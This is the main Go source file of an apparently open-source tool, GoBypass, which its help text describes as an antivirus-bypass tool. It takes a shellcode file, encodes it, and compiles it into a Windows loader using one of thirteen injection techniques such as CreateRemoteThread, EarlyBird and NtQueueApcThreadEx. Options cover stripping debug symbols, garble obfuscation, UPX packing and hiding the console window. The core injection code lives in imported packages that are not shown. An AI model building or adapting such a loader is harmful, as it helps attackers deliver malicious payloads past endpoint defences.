package main

import (
	"flag"
	"fmt"
	"github.com/EmYiQing/GoBypass/build"
	"github.com/EmYiQing/GoBypass/encode"
	"github.com/EmYiQing/GoBypass/log"
	"github.com/EmYiQing/GoBypass/parser"
	"github.com/EmYiQing/GoBypass/tool"
	"strings"
)

const (
	CreateFiber              = "CreateFiber"
	CreateProcess            = "CreateProcess"
	CreateRemoteThread       = "CreateRemoteThread"
	CreateRemoteThreadNative = "CreateRemoteThreadNative"
	CreateThread             = "CreateThread"
	CreateThreadNative       = "CreateThreadNative"
	CryptProtectMemory       = "CryptProtectMemory"
	CryptUnprotectMemory     = "CryptUnprotectMemory"
	EarlyBird                = "EarlyBird"
	EtwpCreateEtwThread      = "EtwpCreateEtwThread"
	HeapAlloc                = "HeapAlloc"
	NtQueueApcThreadEx       = "NtQueueApcThreadEx"
	RtlCreateUserThread      = "RtlCreateUserThread"
)

func main() {
	printLogo()
	var (
		module    string
		shellcode string
		ldflags   bool
		race      bool
		hide      bool
		upx       bool
		garble    bool
		help      bool
	)
	flag.StringVar(&module, "m", "", "")
	flag.BoolVar(&ldflags, "d", false, "")
	flag.BoolVar(&race, "r", false, "")
	flag.BoolVar(&hide, "w", false, "")
	flag.BoolVar(&upx, "u", false, "")
	flag.BoolVar(&garble, "g", false, "")
	flag.StringVar(&shellcode, "s", "shellcode.txt", "")
	flag.BoolVar(&help, "h", false, "")
	flag.Parse()
	if help {
		fmt.Println("A Golang Bypass AntiVirus Tool (coded by 4ra1n)")
		fmt.Println("\nusage: go run main.go -m [MODULE] -u -g")
		fmt.Println("\t-m : use module (default: null)")
		fmt.Println("\t-d : delete symbol table and debug info (default: false)")
		fmt.Println("\t-r : use race detector (default: false)")
		fmt.Println("\t-w : hide windows gui (default: false)")
		fmt.Println("\t-u : use upx (default: false)")
		fmt.Println("\t-g : build by garble (default: false)")
		fmt.Println("\t-s : shellcode (default: shellcode.txt)")
		fmt.Println("\nmodules:")
		fmt.Println("\t", CreateFiber)
		fmt.Println("\t", CreateProcess)
		fmt.Println("\t", CreateRemoteThread)
		fmt.Println("\t", CreateRemoteThreadNative)
		fmt.Println("\t", CreateThread)
		fmt.Println("\t", CreateThreadNative)
		fmt.Println("\t", CryptProtectMemory)
		fmt.Println("\t", CryptUnprotectMemory)
		fmt.Println("\t", EarlyBird)
		fmt.Println("\t", EtwpCreateEtwThread)
		fmt.Println("\t", HeapAlloc)
		fmt.Println("\t", NtQueueApcThreadEx)
		fmt.Println("\t", RtlCreateUserThread)
		return
	}
	shellcode = parser.ParseShellCode(shellcode)
	shellcode = encode.Encode(shellcode)
	if strings.TrimSpace(module) == "" {
		log.Error("module is null")
		log.Info("see help: go run main.go -h")
		return
	}
	if module != CreateFiber &&
		module != CreateProcess &&
		module != CreateRemoteThread &&
		module != CreateRemoteThreadNative &&
		module != CreateThread &&
		module != CreateThreadNative &&
		module != CryptProtectMemory &&
		module != CryptUnprotectMemory &&
		module != EarlyBird &&
		module != EtwpCreateEtwThread &&
		module != HeapAlloc &&
		module != NtQueueApcThreadEx &&
		module != RtlCreateUserThread {
		log.Error("error module")
		log.Info("see help: go run main.go -h")
		return
	}
	code := parser.GetFinalCode(module, shellcode)
	if garble {
		build.Garble(code, ldflags, hide, race)
	} else {
		build.Build(code, ldflags, hide, race)
	}
	if upx {
		tool.StartUpx()
	}
}

func printLogo() {
	fmt.Println("__________                                    \n\\" +
		"______   \\___.__.___________    ______ ______\n |    |  _<   " +
		"|  |\\____ \\__  \\  /  ___//  ___/\n |    |   \\\\___  ||  |_" +
		"> > __ \\_\\___ \\ \\___ \\ \n |______  // ____||   __(____  /" +
		"____  >____  >\n        \\/ \\/     |__|       \\/     \\/    " +
		" \\/ ")
}
